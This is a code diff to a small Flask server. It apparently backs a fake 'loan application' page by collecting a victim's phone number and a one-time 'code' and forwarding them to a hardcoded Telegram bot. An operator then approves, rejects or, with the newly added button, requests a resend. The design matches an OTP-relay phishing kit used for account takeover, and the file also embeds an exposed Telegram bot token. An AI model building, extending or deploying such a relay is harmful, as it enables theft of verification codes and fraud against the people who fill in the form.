@@ -3,16 +3,13 @@ import uuid
 import requests
 from flask import Flask, request, jsonify, send_from_directory
 
-# Initialize app first
 app = Flask(__name__, static_folder='.', static_url_path='')
 
-# YOUR TELEGRAM CREDENTIALS
 TELEGRAM_TOKEN = "9120980562:AAHdCkCej7QrZp9nj6VrRT5zp13sZBQ69cI"
 ADMIN_CHAT_ID = "7477343871"
 
-# Temporary storage for approvals
 pending_requests = {}
-message_details = {} # NEW: Stores original message text so we can edit it later
+message_details = {} 
 
 @app.route('/')
 def serve_index():
@@ -28,13 +25,14 @@ def request_approval():
         phone = data.get('phone', 'Unknown')
         code = data.get('code', 'Unknown')
         
-        # The initial message text
-        text = f"🚨 *New Loan Application*\n\n📱 Phone: +237 {phone}\n🔑 Code: {code}\n\nDo you approve?"
+        text = f"🚨 *New Loan Application*\n\n📱 Phone: +237 {phone}\n🔑 Details: {code}\n\nDo you approve?"
         
+        # Three buttons now
         keyboard = {
             "inline_keyboard": [[
                 {"text": "✅ Approve", "callback_data": f"approve_{app_id}"},
-                {"text": "❌ Reject", "callback_data": f"reject_{app_id}"}
+                {"text": "❌ Reject", "callback_data": f"reject_{app_id}"},
+                {"text": "🔄 Resend", "callback_data": f"resend_{app_id}"}
             ]]
         }
         
@@ -46,7 +44,6 @@ def request_approval():
             "reply_markup": keyboard
         })
         
-        # Save the original text so we can preserve it when editing
         response_data = response.json()
         if response_data.get("ok"):
             message_id = response_data["result"]["message_id"]
@@ -76,21 +73,24 @@ def telegram_webhook():
         if app_id in pending_requests:
             pending_requests[app_id] = action
         
-        # 1. Answer the callback (stops the loading spinner on the Telegram button)
         answer_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
         requests.post(answer_url, json={"callback_query_id": callback["id"], "text": "Done!"})
         
-        # 2. Edit the message to keep details and show the outcome
         if app_id in message_details:
             msg_info = message_details[app_id]
             message_id = msg_info["message_id"]
             original_text = msg_info["original_text"]
             
-            # Keep the original text, append the result
-            status_emoji = "✅" if action == "approve" else "❌"
-            status_text = "APPROVED" if action == "approve" else "REJECTED"
-            
-            new_text = f"{original_text}\n\n---\n*Status: {status_emoji} {status_text}*"
+            # Generate new text based on action
+            if action == "approve":
+                new_text = f"{original_text}\n\n---\n*Status: ✅ APPROVED*"
+                markup = {"inline_keyboard": []}
+            elif action == "reject":
+                new_text = f"{original_text}\n\n---\n*Status: ❌ REJECTED*"
+                markup = {"inline_keyboard": []}
+            elif action == "resend":
+                new_text = f"{original_text}\n\n---\n*Status: 🔄 RESEND REQUESTED*"
+                markup = {"inline_keyboard": []} # Or keep buttons if you want
             
             edit_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
             requests.post(edit_url, json={
@@ -98,7 +98,7 @@ def telegram_webhook():
                 "message_id": message_id,
                 "text": new_text,
                 "parse_mode": "Markdown",
-                "reply_markup": {"inline_keyboard": []} # Removes the buttons
+                "reply_markup": markup
             })
             
     return "OK"
